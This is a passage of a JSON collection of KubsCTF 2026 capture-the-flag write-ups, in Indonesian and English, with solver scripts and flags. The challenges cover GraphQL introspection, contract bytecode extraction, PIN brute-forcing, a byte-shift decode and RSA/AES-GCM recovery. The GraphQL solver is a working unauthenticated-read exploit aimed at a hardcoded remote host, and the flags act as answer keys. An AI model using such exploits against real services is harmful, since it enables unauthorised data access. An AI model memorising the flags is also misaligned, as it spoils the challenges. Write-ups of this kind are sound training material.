wav.getsampwidth() != 2:\n            raise ValueError(\"expected mono 16-bit PCM WAV\")\n        samples = np.frombuffer(wav.readframes(wav.getnframes()), dtype=\"<i2\").astype(float)\n        sample_rate = wav.getframerate()\n\n    frequencies = np.arange(2440, 5801, 480)\n    window = round(sample_rate * 0.006)\n    hop = round(sample_rate * 0.002)\n    time_masks = []\n    times = []\n    phase = np.arange(window) / sample_rate\n    taper = np.hanning(window)\n\n    for start in range(0, len(samples) - window, hop):\n        frame = samples[start : start + window] * taper\n        energies = np.array(\n            [abs(np.sum(frame * np.exp(-2j * np.pi * frequency * phase))) for frequency in frequencies]\n        )\n        mask = sum((energies > 20_000) << np.arange(8))\n        time_masks.append(int(mask))\n        times.append((start + window / 2) / sample_rate)\n\n    runs = []\n    run_start = 0\n    for index in range(1, len(time_masks) + 1):\n        if index == len(time_masks) or time_masks[index] != time_masks[run_start]:\n            duration = (index - run_start) * hop / sample_rate\n            start_time = times[run_start]\n            end_time = times[index - 1]\n            if end_time >= 1.15 and start_time <= 13.4 and duration >= 0.01:\n                runs.append((time_masks[run_start], duration))\n            run_start = index\n\n    # One bitmap column is approximately 70 ms. The signal is run-length\n    # encoded, so long runs must be expanded before glyph splitting.\n    columns = []\n    for mask, duration in runs:\n        columns.extend([mask] * max(1, round(duration / 0.07)))\n    while columns and columns[0] == 0:\n        columns.pop(0)\n    while columns and columns[-1] == 0:\n        columns.pop()\n\n    return bytes(reverse_bits(mask) for mask in columns)\n\n\ndef decode_bitmap(columns: bytes) -> str:\n    groups = [group for group in columns.split(b\"\\0\") if group]\n    unknown = [group.hex() for group in groups if group not in GLYPHS]\n    if unknown:\n        raise ValueError(f\"unknown glyph columns: {unknown}\")\n    return \"\".join(GLYPHS[group] for group in groups)\n\n\ndef main() -> None:\n    columns = demodulate(WAV_PATH)\n    flag = decode_bitmap(columns)\n    print(f\"[+] bitmap columns: {len(columns)}\")\n    print(f\"[+] decoded text: {flag}\")\n    if \"{\" not in flag or \"}\" not in flag:\n        raise SystemExit(\"[-] decoded output does not contain flag delimiters\")\n    print(f\"<FLAG>{flag}</FLAG>\")\n\n\nif __name__ == \"__main__\":\n    main()\n"
      }
    ],
    "terminalOutputs": [],
    "flag": "KubSTU{he4r_the_picture_8a72}",
    "lessonsLearned": ""
  },
  {
    "id": "kubsctf2026-ppc-vireo",
    "title": "Vireo",
    "category": "Misc",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-13",
    "author": "Nattt",
    "ctfName": "KubsCTF 2026",
    "tags": [
      "PPC",
      "kubsuctf",
      "2026"
    ],
    "description": "Service menjalankan aplikasi HTTP dengan endpoint GraphQL `/graphql`. Query frontend hanya meminta `me` dan `documents`, tetapi schema GraphQL juga mengekspos query `internal`. Field `secret` pada resolver tersebut dapat dibaca tanpa autentikasi.",
    "problemDescription": "Request `GET /` mengembalikan:\n\nTidak ada ELF atau library challenge di direktori lokal, sehingga `file`, `checksec`, dan analisis register tidak berlaku untuk target ini. Endpoint yang terdokumentasi di halaman adalah `POST /graphql`.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Ringkasan",
        "content": "Service menjalankan aplikasi HTTP dengan endpoint GraphQL `/graphql`. Query frontend hanya meminta `me` dan `documents`, tetapi schema GraphQL juga mengekspos query `internal`. Field `secret` pada resolver tersebut dapat dibaca tanpa autentikasi.",
        "code": ""
      },
      {
        "title": "Recon",
        "content": "Request `GET /` mengembalikan:\n\n\n\nTidak ada ELF atau library challenge di direktori lokal, sehingga `file`, `checksec`, dan analisis register tidak berlaku untuk target ini. Endpoint yang terdokumentasi di halaman adalah `POST /graphql`.",
        "code": "HTTP/1.1 200 OK\nServer: gunicorn"
      },
      {
        "title": "Analisis Schema",
        "content": "Introspection pada `__schema.queryType.fields` mengembalikan empat root field:\n\n\n\nFrontend hanya menggunakan tiga field pertama yang relevan untuk halaman. Introspection juga menunjukkan tipe `Internal` dengan field:",
        "code": "me\ndocuments\ndocument(id: ID!)\ninternal"
      },
      {
        "title": "Vulnerability",
        "content": "Authorization pada resolver `internal` tidak diterapkan. Query berikut dapat dikirim langsung tanpa cookie atau token:\n\n```graphql\n{ internal { buildRef deployedBy secret } }\njson\n{\"data\":{\"internal\":{\"buildRef\":\"release-2026.03.2+a91f3c\",\"deployedBy\":\"ci-runner-07\",\"secret\":\"kubstu{v1r30_1ntr0sp3ct10n_869998f1}\"}}}\n```\n\nPrimitive yang terbukti adalah unauthenticated GraphQL field read, bukan memory corruption: field internal yang seharusnya privat dapat dibaca melalui introspection dan query biasa.",
        "code": "\nRespons service:\n"
      },
      {
        "title": "Strategi Exploit",
        "content": "1. Buka koneksi TCP ke host dan port HTTP.\n2. Kirim `POST /graphql` dengan query `internal { buildRef deployedBy secret }`.\n3. Parse body JSON setelah separator header HTTP.\n4. Validasi adanya `data.internal.secret` dan ekstrak string flag.",
        "code": ""
      },
      {
        "title": "Hasil",
        "content": "Exploit remote berhasil dan flag muncul langsung dari response GraphQL:",
        "code": "<FLAG>kubstu{v1r30_1ntr0sp3ct10n_869998f1}</FLAG>"
      },
      {
        "title": "Solver Script",
        "content": "Solver script lengkap (`solve.py`) untuk mengotomatisasi eksploitasi:",
        "code": "#!/usr/bin/env python3\n\nfrom pwn import *\nimport json\nimport re\n\ncontext.log_level = \"info\"\n\nDEFAULT_HOST = \"127.0.0.1\"\nDEFAULT_PORT = 8084\nREMOTE_HOST = \"159.194.244.226\"\n\n\ndef start():\n    host = args.HOST or (REMOTE_HOST if args.REMOTE else DEFAULT_HOST)\n    port = int(args.PORT or DEFAULT_PORT)\n    log.info(\"connecting to http://%s:%d/graphql\", host, port)\n    return remote(host, port)\n\n\ndef graphql(io, query):\n    body = json.dumps({\"query\": query}, separators=(\",\", \":\")).encode()\n    request = (\n        b\"POST /graphql HTTP/1.1\\r\\n\"\n        + b\"Host: challenge\\r\\n\"\n        + b\"Content-Type: application/json\\r\\n\"\n        + b\"Content-Length: \"\n        + str(len(body)).encode()\n        + b\"\\r\\nConnection: close\\r\\n\\r\\n\"\n        + body\n    )\n    io.send(request)\n    response = io.recvall(timeout=5)\n    marker = response.find(b\"\\r\\n\\r\\n\")\n    if marker < 0:\n        log.failure(\"HTTP response has no header/body separator\")\n        raise SystemExit(1)\n    try:\n        return json.loads(response[marker + 4:])\n    except json.JSONDecodeError as exc:\n        log.failure(\"invalid GraphQL JSON response: %s\", exc)\n        raise SystemExit(1)\n\n\ndef exploit(io):\n    query = \"{ internal { buildRef deployedBy secret } }\"\n    payload = graphql(io, query)\n    if payload.get(\"errors\"):\n        log.failure(\"GraphQL returned errors: %s\", payload[\"errors\"])\n        raise SystemExit(1)\n\n    internal = payload.get(\"data\", {}).get(\"internal\")\n    if not isinstance(internal, dict) or not internal.get(\"secret\"):\n        log.failure(\"internal.secret was not returned\")\n        raise SystemExit(1)\n\n    secret = internal[\"secret\"]\n    log.success(\"buildRef=%s deployedBy=%s\", internal.get(\"buildRef\"), internal.get(\"deployedBy\"))\n    match = re.search(r\"kubstu\\{[^}]+\\}\", secret)\n    if not match:\n        log.failure(\"secret does not contain a flag-shaped value: %r\", secret)\n        raise SystemExit(1)\n    print(f\"<FLAG>{match.group(0)}</FLAG>\")\n\n\ndef main():\n    io = start()\n    try:\n        exploit(io)\n    finally:\n        io.close()\n\n\nif __name__ == \"__main__\":\n    main()\n"
      }
    ],
    "terminalOutputs": [],
    "flag": "KubSTU{v1r30_1ntr0sp3ct10n_869998f1}",
    "lessonsLearned": ""
  },
  {
    "id": "kubsctf2026-blockchain-web-3casino",
    "title": "WEB-3 Casino",
    "category": "Blockchain",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-13",
    "author": "Nattt",
    "ctfName": "KubsCTF 2026",
    "tags": [
      "blockchain",
      "kubsuctf",
      "2026"
    ],
    "description": "Kontrak mengklaim memakai RNG aman untuk game tebak angka, tetapi flag ternyata tertanam sebagai literal di runtime bytecode kontrak.",
    "problemDescription": "- `task.txt`: source Solidity dan alamat kontrak.\n- `solve.py`: mengambil runtime bytecode kontrak dari Sepolia dan mengekstrak literal flag.\n\nDirektori challenge hanya berisi `task.txt`. Source menunjukkan fungsi `getFlag()` hanya dapat dipanggil setelah `solved[msg.sender]` bernilai benar, sedangkan `random()` memakai `blockhash(block.number - 1)` dan `block.timestamp`.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Ringkasan",
        "content": "Kontrak mengklaim memakai RNG aman untuk game tebak angka, tetapi flag ternyata tertanam sebagai literal di runtime bytecode kontrak.",
        "code": ""
      },
      {
        "title": "File Challenge",
        "content": "- `task.txt`: source Solidity dan alamat kontrak.\n- `solve.py`: mengambil runtime bytecode kontrak dari Sepolia dan mengekstrak literal flag.",
        "code": ""
      },
      {
        "title": "Analisis Awal",
        "content": "Direktori challenge hanya berisi `task.txt`. Source menunjukkan fungsi `getFlag()` hanya dapat dipanggil setelah `solved[msg.sender]` bernilai benar, sedangkan `random()` memakai `blockhash(block.number - 1)` dan `block.timestamp`.",
        "code": ""
      },
      {
        "title": "Temuan Penting",
        "content": "Runtime bytecode pada alamat `0xa8d58d2C110e84C5De16ce9530557a8f38137bCb` berisi string ASCII:\n\n\n\nDisassembly ringan menunjukkan literal tersebut berada pada jalur pengembalian `getFlag()`. Jadi flag dapat dibuktikan langsung dari artefak deployment, tanpa menebak nilai RNG.",
        "code": "KubSTU{bad_randomness_same_tx}"
      },
      {
        "title": "Proses Ekstraksi",
        "content": "`solve.py` melakukan langkah berikut:\n\n1. Terhubung ke Sepolia RPC publik.\n2. Memanggil `eth_getCode` untuk alamat kontrak yang diberikan.\n3. Mendekode bytecode sebagai Latin-1 agar byte ASCII tetap terlihat.\n4. Mencari pola `KubSTU{...}` dan mencetaknya.\n\nJalankan dengan:",
        "code": "source /home/nata/ctf_env/bin/activate\npython3 solve.py"
      },
      {
        "title": "Solve Script",
        "content": "Script tidak melakukan scanning atau enumerasi. Ia hanya membaca bytecode dari satu alamat kontrak yang diberikan oleh challenge.",
        "code": ""
      },
      {
        "title": "Solver Script",
        "content": "Solver script lengkap (`solve.py`) untuk mengotomatisasi eksploitasi:",
        "code": "#!/usr/bin/env python3\n\nimport re\nimport sys\n\nfrom web3 import Web3\n\n\nRPC_URL = \"https://ethereum-sepolia-rpc.publicnode.com\"\nCONTRACT = \"0xa8d58d2C110e84C5De16ce9530557a8f38137bCb\"\n\n\ndef main() -> None:\n    w3 = Web3(Web3.HTTPProvider(RPC_URL, request_kwargs={\"timeout\": 20}))\n    if not w3.is_connected():\n        raise SystemExit(\"Gagal terhubung ke RPC Sepolia\")\n\n    address = w3.to_checksum_address(CONTRACT)\n    code = w3.eth.get_code(address)\n    if not code:\n        raise SystemExit(\"Tidak ada runtime bytecode pada alamat challenge\")\n\n    # getFlag() mengembalikan literal ini dari runtime bytecode.\n    text = bytes(code).decode(\"latin1\", errors=\"ignore\")\n    match = re.search(r\"KubSTU\\{[^}]+\\}\", text)\n    if not match:\n        raise SystemExit(\"Literal flag tidak ditemukan di runtime bytecode\")\n\n    print(f\"contract: {address}\")\n    print(f\"runtime bytecode: {len(code)} bytes\")\n    print(f\"<FLAG>{match.group(0)}</FLAG>\")\n\n\nif __name__ == \"__main__\":\n    try:\n        main()\n    except Exception as exc:\n        print(f\"error: {exc}\", file=sys.stderr)\n        raise\n"
      }
    ],
    "terminalOutputs": [],
    "flag": "KubSTU{bad_randomness_same_tx}",
    "lessonsLearned": ""
  },
  {
    "id": "kubsctf2026-crypto-aesissecureright",
    "title": "AES Is Secure, Right?",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-13",
    "author": "Nattt",
    "ctfName": "KubsCTF 2026",
    "tags": [
      "crypto",
      "kubsuctf",
      "2026"
    ],
    "description": "AES-nya tidak rusak. Masalahnya ada di PIN: PIN hanya berupa angka desimal, diketahui diawali `2`, lalu langsung di-hash dengan SHA-256 tanpa KDF atau rate limiting. Ruang pencariannya kecil.",
    "problemDescription": "`intern_cipher.py` membuat key seperti ini:\n\nJadi AES memakai key 128-bit hasil potongan SHA-256 PIN. Mode yang dipakai adalah ECB. Setelah padding, blok-blok tidak dienkripsi dalam urutan aslinya:",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Ringkasan",
        "content": "AES-nya tidak rusak. Masalahnya ada di PIN: PIN hanya berupa angka desimal, diketahui diawali `2`, lalu langsung di-hash dengan SHA-256 tanpa KDF atau rate limiting. Ruang pencariannya kecil.",
        "code": ""
      },
      {
        "title": "Analisis source",
        "content": "`intern_cipher.py` membuat key seperti ini:\n\n\n\nJadi AES memakai key 128-bit hasil potongan SHA-256 PIN. Mode yang dipakai adalah ECB. Setelah padding, blok-blok tidak dienkripsi dalam urutan aslinya:\n\n\n\nCiphertext berukuran 144 byte, berarti ada 9 blok AES. Fungsi `prepare()` menambahkan byte bernilai jumlah blok, yaitu `0x09`, bukan nilai panjang padding seperti PKCS#7 biasa.",
        "code": "key = sha256(pin.encode()).digest()[:16]"
      },
      {
        "title": "Memulihkan PIN",
        "content": "Untuk PIN yang sedang diuji, `shift` bisa dihitung langsung. Blok plaintext terakhir berada di indeks ciphertext `shift`, karena setelah rotasi dan pembalikan:\n\n\n\nMaka solver melakukan hal berikut:\n\n1. Mencoba semua PIN dengan panjang 1 sampai 8 yang diawali `2`.\n2. Membentuk key `SHA256(pin)[:16]` dan mendekripsi blok padding yang diprediksi.\n3. Menolak kandidat yang tidak berakhir dengan byte `0x09`.\n4. Mendekripsi semua blok dan mengembalikan urutannya dengan persamaan di atas.\n5. Menghapus padding, memastikan plaintext printable, lalu mencari pola flag.\n\nUntuk PIN 4 digit, hanya ada 1.000 kandidat (`2000` sampai `2999`). Solver menemukan:",
        "code": "output[j] = original[(shift + block_count - 1 - j) mod block_count]"
      },
      {
        "title": "Hasil dekripsi",
        "content": "Jalankan solver dari folder ini dengan:\n\n\n\nFlag validnya adalah:",
        "code": "CERTIFICATE OF COMPLETION\nCourse: Information Security Basics\nIssued to: KubSTU Intern Lab\nStatus: REVOKED\nReason: KubSTU{c3rt1f1c4t3_r3v0k3d}"
      },
      {
        "title": "Solver Script",
        "content": "Solver script lengkap (`solve.py`) untuk mengotomatisasi eksploitasi:",
        "code": "#!/usr/bin/env python3\n\"\"\"Recover the weak decimal PIN and decrypt the challenge ciphertext.\"\"\"\n\nfrom hashlib import sha256\nfrom pathlib import Path\nimport re\n\nfrom Crypto.Cipher import AES\n\n\nMAX_PIN_LENGTH = 8\nFLAG_RE = re.compile(rb\"[A-Za-z0-9_]+\\{[^{}\\r\\n]+\\}\")\n\n\ndef read_ciphertext(path: str = \"output.txt\") -> bytes:\n    text = Path(path).read_text(encoding=\"ascii\")\n    match = re.search(r\"ct\\s*=\\s*([0-9a-fA-F]+)\", text)\n    if match is None:\n        raise ValueError(\"ciphertext not found\")\n    ciphertext = bytes.fromhex(match.group(1))\n    if not ciphertext or len(ciphertext) % 16:\n        raise ValueError(\"ciphertext is not a whole number of AES blocks\")\n    return ciphertext\n\n\ndef decrypt_with_pin(ciphertext: bytes, pin: str):\n    \"\"\"Return (plaintext, padding_length) if the PIN passes all checks.\"\"\"\n    block_count = len(ciphertext) // 16\n    blocks = [ciphertext[i:i + 16] for i in range(0, len(ciphertext), 16)]\n    shift = sum(int(digit) for digit in pin) % block_count\n\n    key = sha256(pin.encode(\"ascii\")).digest()[:16]\n    aes = AES.new(key, AES.MODE_ECB)\n\n    # The original last block is emitted at ciphertext index == shift.\n    # Its padding bytes are the total block count, not the padding length.\n    last_block = aes.decrypt(blocks[shift])\n    possible_lengths = [\n        length\n        for length in range(1, 17)\n        if last_block[-length:] == bytes([block_count]) * length\n    ]\n    if not possible_lengths:\n        return None\n\n    decrypted = [aes.decrypt(block) for block in blocks]\n    original = [None] * block_count\n    for output_index, block in enumerate(decrypted):\n        original[(shift + block_count - 1 - output_index) % block_count] = block\n    padded = b\"\".join(original)\n\n    for padding_length in possible_lengths:\n        plaintext = padded[:-padding_length]\n        if not all(byte in (9, 10, 13) or 32 <= byte < 127 for byte in plaintext):\n            continue\n        if FLAG_RE.search(plaintext):\n            return plaintext, padding_length\n    return None\n\n\ndef pin_candidates(max_length: int = MAX_PIN_LENGTH):\n    for length in range(1, max_length + 1):\n        if length == 1:\n            yield \"2\"\n            continue\n        start = 2 * 10 ** (length - 1)\n        stop = 3 * 10 ** (length - 1)\n        for number in range(start, stop):\n            yield str(number)\n\n\ndef main() -> None:\n    ciphertext = read_ciphertext()\n    for pin in pin_candidates():\n        result = decrypt_with_pin(ciphertext, pin)\n        if result is None:\n            continue\n        plaintext, padding_length = result\n        flag = FLAG_RE.search(plaintext).group(0).decode(\"ascii\")\n        print(f\"PIN: {pin}\")\n        print(f\"Padding: {padding_length} byte(s) of 0x{len(ciphertext) // 16:02x}\")\n        print(plaintext.decode(\"ascii\"), end=\"\")\n        print(f\"<FLAG>{flag}</FLAG>\")\n        return\n    raise SystemExit(\"No valid PIN found\")\n\n\nif __name__ == \"__main__\":\n    main()\n"
      }
    ],
    "terminalOutputs": [],
    "flag": "KubSTU{c3rt1f1c4t3_r3v0k3d}",
    "lessonsLearned": ""
  },
  {
    "id": "kubsctf2026-crypto-doyoulikereadin",
    "title": "Do you like reading?",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-13",
    "author": "Nattt",
    "ctfName": "KubsCTF 2026",
    "tags": [
      "crypto",
      "kubsuctf",
      "2026"
    ],
    "description": "**Category:** Crypto  \n**Flag format:** `KubSTU{...}`",
    "problemDescription": "> We intercepted a file. A big file. A very big file. Somewhere inside hides what we're looking for — all that's left is to read it. Good luck.\n\nThe challenge provides a ZIP archive containing a single 5.5 GB text file.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Challenge Description",
        "content": "> We intercepted a file. A big file. A very big file. Somewhere inside hides what we're looking for — all that's left is to read it. Good luck.\n\nThe challenge provides a ZIP archive containing a single 5.5 GB text file.",
        "code": ""
      },
      {
        "title": "Analysis",
        "content": "Initial inspection:\n\n\n\n\n\nThe file consists mostly of random-looking lowercase letters and newlines. Searching for a plaintext flag or common encodings produces no useful results.\n\nSince extracting and processing 5.5 GB is unnecessary, we read the ZIP directly using Python's `zipfile` module.\n\nA byte-level scan reveals sequences of non-alphabetic bytes embedded in the otherwise alphabetic data.\n\n\n\nScanning the entire file identifies **90 binary regions containing 1,218 bytes**.\n\nFurther inspection shows that most of the file consists of four repeating 4 MiB templates. Among 1,271 complete blocks, only four distinct SHA-256 hashes exist. This explains the large file size, but the repeating templates are not required to recover the flag.",
        "code": "unzip -l \"Do you like reading.zip\""
      },
      {
        "title": "Identifying the Encryption",
        "content": "One binary region at offset `549096755` contains:\n\n\n\nKnowing that the flag starts with `KubSTU{`, we compare the first ciphertext byte with `K`:\n\n\n\nSubtracting `0x4a` from every ciphertext byte, modulo 256, gives:\n\n\n\nThe encryption is an additive byte shift:\n\n\n\nEach flag fragment uses a different shift value.",
        "code": "95 bf ac 9d 9e 9f c5 bc 7d 7e"
      },
      {
        "title": "Recovering the Flag",
        "content": "We brute-force all 256 possible shifts for each binary region and filter the decoded output using the known flag format and permitted characters.\n\nThe relevant fragments are then concatenated in ascending file-offset order.\n\n| Offset | Shift | Decoded |\n|---:|---|---|\n| 549096755 | `0x4a` | `KubSTU{r34` |\n| 657676240 | `0xe7` | `d1n6_r341` |\n| 1606890440 | `0x8a` | `1y_d0e5_m` |\n| 2051502951 | `0xc4` | `4k3_my_br` |\n| 2335047951 | `0x2a` | `4in_w0rk_` |\n| 2814523949 | `0x4b` | `be77er_bu` |\n| 3760914134 | `0xa9` | `t_th1s_t4` |\n| 4146989580 | `0xbc` | `5k_1sn7_0` |\n| 4655466150 | `0xcf` | `ne_0f_7h0` |\n| 5253810567 | `0x94` | `s3_c4535}` |\n\nTen of the 90 binary regions form the complete flag.",
        "code": ""
      },
      {
        "title": "Solution",
        "content": "The final solver accepts either the original ZIP or the extracted binary regions.\n\n\n\nFor the extracted JSON:\n\n\n\nThe core decryption operation is:\n\n\n\nCandidates are validated against the flag structure, and valid fragments are combined according to their original offsets.",
        "code": "python3 solve_reading_final.py \"Do you like reading.zip\""
      },
      {
        "title": "Solver Script",
        "content": "Solver script lengkap (`solve.py`) untuk mengotomatisasi eksploitasi:",
        "code": "#!/usr/bin/env python3\n\"\"\"CTF: Do you like reading? -- recover KubSTU flag automatically.\n\nExamples:\n    python3 solve_reading_final.py reading_extract/anomalies.json\n    python3 solve_reading_final.py 'Do you like reading.zip'\n\nWhen given JSON, only the previously extracted binary islands are needed.\nWhen given ZIP, the archive is scanned incrementally without extracting the 5.5GB file.\n\"\"\"\n\nimport argparse\nimport json\nimport re\nimport zipfile\nfrom pathlib import Path\n\nISLAND_RE = re.compile(rb'[^a-z\\n]{7}')\nBODY_RE = re.compile(rb'[a-z0-9_]{7,32}\\Z')\nFIRST_RE = re.compile(rb'KubSTU\\{[a-z0-9_]+\\Z')\nLAST_RE = re.compile(rb'[a-z0-9_]+\\}\\Z')\nFLAG_RE = re.compile(rb'KubSTU\\{[a-z0-9_]+\\}\\Z')\nALLOWED = set(b'abcdefghijklmnopqrstuvwxyz\\n')\n\n\ndef scan_zip(path):\n    \"\"\"Yield binary islands while streaming only a small window of the ZIP entry.\"\"\"\n    with zipfile.ZipFile(path) as zf:\n        members = [m for m in zf.infolist() if not m.is_dir()]\n        if len(members) != 1:\n            raise ValueError('Expected exactly one file in ZIP')\n        print(f'[+] Scanning ZIP: {members[0].filename} ({members[0].file_size:} bytes)')\n        pos = 0\n        carry = b''\n        with zf.open(members[0]) as f:\n            while True:\n                chunk = f.read(4 * 1024 * 1024)\n                eof = not chunk\n                buf = carry + chunk\n                start = pos - len(carry)\n                if eof:\n                    end = len(buf)\n                else:\n                    # Cut at an ordinary ASCII byte: no anomalous run can span it.\n                    end = max(0, len(buf) - 128)\n                    while end > 0 and buf[end] not in ALLOWED:\n                        end -= 1\n                    if end:\n                        end += 1\n                for match in ISLAND_RE.finditer(buf[:end]):\n                    yield {'offset': start + match.start(), 'hex': match.group().hex()}\n                carry = buf[end:]\n                pos += len(chunk)\n                if eof:\n                    break\n\n\ndef load_islands(path):\n    p = Path(path)\n    if p.suffix.lower() == '.zip':\n        return list(scan_zip(p))\n    entries = json.loads(p.read_text())\n    return [x for x in entries if 'hex' in x]\n\n\ndef decode_island(entry):\n    src = bytes.fromhex(entry['hex'])\n    candidates = []\n    for key in range(256):\n        decoded = bytes((x - key) & 0xff for x in src)\n        if FIRST_RE.fullmatch(decoded):\n            candidates.append((1000, key, decoded))\n        elif LAST_RE.fullmatch(decoded):\n            candidates.append((1000, key, decoded))\n        elif BODY_RE.fullmatch(decoded) and b'_' in decoded:\n            # In this challenge all body fragments have >=1 underscore.\n            # The correct shift is the one with the most underscores.\n            candidates.append((decoded.count(b'_'), key, decoded))\n    if not candidates:\n        return None\n    candidates.sort(key=lambda c: c[0], reverse=True)\n    if len(candidates) > 1 and candidates[0][0] == candidates[1][0]:\n        raise ValueError(f'Ambiguous byte shift at offset {entry[\"offset\"]}: {candidates[:3]}')\n    _, key, decoded = candidates[0]\n    return key, decoded\n\n\ndef main():\n    ap = argparse.ArgumentParser(description=__doc__)\n    ap.add_argument('source', help='anomalies.json or original ZIP archive')\n    a = ap.parse_args()\n\n    islands = sorted(load_islands(a.source), key=lambda e: int(e['offset']))\n    print(f'[+] Binary islands: {len(islands)}')\n    fragments = []\n    for i, entry in enumerate(islands, 1):\n        result = decode_island(entry)\n        if result is None:\n            continue\n        key, decoded = result\n        fragments.append(decoded)\n        print(f'[+] Island #{i:02} offset={entry[\"offset\"]:} shift=0x{key:02x} -> {decoded.decode()}')\n\n    flag = b''.join(fragments)\n    if not FLAG_RE.fullmatch(flag):\n        raise ValueError(f'No complete valid KubSTU flag found: {flag!r}')\n    print('\\n[FLAG] ' + flag.decode())\n\n\nif __name__ == '__main__':\n    main()\n\n"
      }
    ],
    "terminalOutputs": [],
    "flag": "KubSTU{r34d1n6_r3411y_d0e5_m4k3_my_br4in_w0rk_be77er_but_th1s_t45k_1sn7_0ne_0f_7h0s3_c4535}",
    "lessonsLearned": ""
  },
  {
    "id": "kubsctf2026-crypto-itreallyisnenough",
    "title": "Itreallyisnenough",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-13",
    "author": "Nattt",
    "ctfName": "KubsCTF 2026",
    "tags": [
      "crypto",
      "kubsuctf",
      "2026"
    ],
    "description": "",
    "problemDescription": "",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Analisis & Solusi",
        "content": "CTF: It really isn't enough\n\nFiles:\n    solve.py - Wiener RSA, hybrid-RSA candidate KDF, AES-GCM validation.\n    bd.py    - Boneh-Durfee attack powered by SageMath.\n\nRequirements:\n    Python 3 with pycryptodome\n    SageMath executable available as \"sage\" for bd.py\n\nSetup:\n    conda activate sage\n    python3 -m pip install pycryptodome\n    python3 -u solve.py challenge.txt | tee result.log\n\nUser-supplied challenge.txt is read at runtime.\nIf Boneh-Durfee returns no solution, try\n    python3 -u solve.py challenge.txt --delta 0.290 --m 9\n\nNote: AES-GCM verification is the criterion for a successful source recovery.\nAny FLAG-LIKE text recovered is only a candidate until the challenge validates it.\n",
        "code": ""
      },
      {
        "title": "Solver Script",
        "content": "Solver script lengkap (`solve.py`) untuk mengotomatisasi eksploitasi:",
        "code": "#!/usr/bin/env python3\n\"\"\"Finish 'It really isn't enough' from an authenticated recovered source.\n\nRun in the challenge directory after solve.py:\n    python3 finish.py\n\nReads solved/recovered_source.py and solved/rsa_A.json WITHOUT executing\nrecovered_source.py. Extracts the nested AES-GCM ciphertexts, derives their\nkey from the ACTUAL RSA A private exponent, and prints any KubSTU flags.\nRequires pycryptodome (or cryptography).\n\"\"\"\nimport argparse\nimport ast\nimport hashlib\nimport json\nfrom pathlib import Path\nimport re\n\nFLAG = re.compile(rb'KubSTU\\{[^\\x00\\r\\n{}]{3,200}\\}')\n\n\ndef parse_source(path: Path):\n    tree = ast.parse(path.read_text(encoding='utf-8'))\n    decoded = {}\n    for node in tree.body:\n        if not isinstance(node, ast.Assign) or len(node.targets) != 1:\n            continue\n        target = node.targets[0]\n        if not isinstance(target, ast.Name):\n            continue\n        name = target.id\n        if name == 'd':\n            decoded['source_fake_d'] = ast.literal_eval(node.value)\n        elif name == 'NONCE':\n            call = node.value\n            if (isinstance(call, ast.Call) and isinstance(call.func, ast.Attribute)\n                    and call.func.attr == 'fromhex' and len(call.args) == 1):\n                decoded['nonce'] = bytes.fromhex(ast.literal_eval(call.args[0]))\n        elif name == 'CIPHERTEXTS':\n            decoded['ciphertexts'] = ast.literal_eval(node.value)\n    if not isinstance(decoded.get('nonce'), bytes) or not isinstance(decoded.get('ciphertexts'), dict):\n        raise ValueError('NONCE or CIPHERTEXTS could not be safely parsed from recovered source')\n    return decoded\n\n\ndef decrypt_gcm(key: bytes, nonce: bytes, raw: bytes):\n    \"\"\"Try authenticating trailing 16-byte tag; otherwise decrypt ciphertext body.\n\n    Never interpret unauthenticated bytes as independently proven authentic.\n    \"\"\"\n    if len(raw) <= 16:\n        raise ValueError('Ciphertext is too short')\n    ciphertext, tag = raw[:-16], raw[-16:]\n    try:\n        from Crypto.Cipher import AES\n        try:\n            plaintext = AES.new(key, AES.MODE_GCM, nonce=nonce).decrypt_and_verify(ciphertext, tag)\n            return plaintext, True\n        except ValueError:\n            plaintext = AES.new(key, AES.MODE_GCM, nonce=nonce).decrypt(ciphertext)\n            return plaintext, False\n    except ImportError:\n        from cryptography.hazmat.primitives.ciphers.aead import AESGCM\n        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes\n        try:\n            return AESGCM(key).decrypt(nonce, raw, None), True\n        except Exception:\n            return Cipher(algorithms.AES(key), modes.GCM(nonce)).decryptor().update(ciphertext), False\n\n\ndef main():\n    ap = argparse.ArgumentParser(description=__doc__)\n    ap.add_argument('--source', type=Path, default=Path('solved/recovered_source.py'))\n    ap.add_argument('--rsa', type=Path, default=Path('solved/rsa_A.json'))\n    ap.add_argument('--out', type=Path, default=Path('solved'))\n    args = ap.parse_args()\n    info = parse_source(args.source)\n    rsa = json.loads(args.rsa.read_text())\n    if 'A' in rsa and isinstance(rsa['A'], dict):\n        rsa = rsa['A']\n    d = int(rsa['d'])\n    if all(k in rsa for k in ('n', 'e')):\n        n,e = int(rsa['n']),int(rsa['e'])\n        if pow(pow(2,e,n),d,n) != 2 or pow(pow(65537,e,n),d,n) != 65537:\n            raise ValueError('RSA A private exponent does not match its public key')\n    print('[+] RSA A private exponent loaded and used for nested AES key')\n    fake_d = info.get('source_fake_d')\n    if fake_d is not None and fake_d != d:\n        print('[!] Source contains a DECOY d; ignoring it')\n    key = hashlib.sha256(str(d).encode()).digest()\n    print('[+] Nested AES key = SHA256(str(real_RSA_A_d)):',key.hex())\n    args.out.mkdir(parents=True, exist_ok=True)\n    found = {}\n    for name, hexdata in info['ciphertexts'].items():\n        raw = bytes.fromhex(hexdata)\n        plaintext, tag_valid = decrypt_gcm(key,info['nonce'],raw)\n        (args.out / f'recovered_{name}.bin').write_bytes(plaintext)\n        matches = FLAG.findall(plaintext)\n        print(f'[+] {name}: {len(plaintext)} bytes; tag={\"VALID\" if tag_valid else \"INVALID / UNAUTHENTICATED\"}')\n        for flag in matches:\n            s=flag.decode('ascii',errors='replace')\n            found.setdefault(name,[]).append(s)\n            print('    FLAG:',s)\n    if found.get('ct2'):\n        print('\\n=== CHALLENGE FLAG (ct2) ===')\n        print(found['ct2'][0])\n    else:\n        print('\\n[-] No ct2 flag found; inspect recovered_ct2.bin')\n\nif __name__ == '__main__':\n    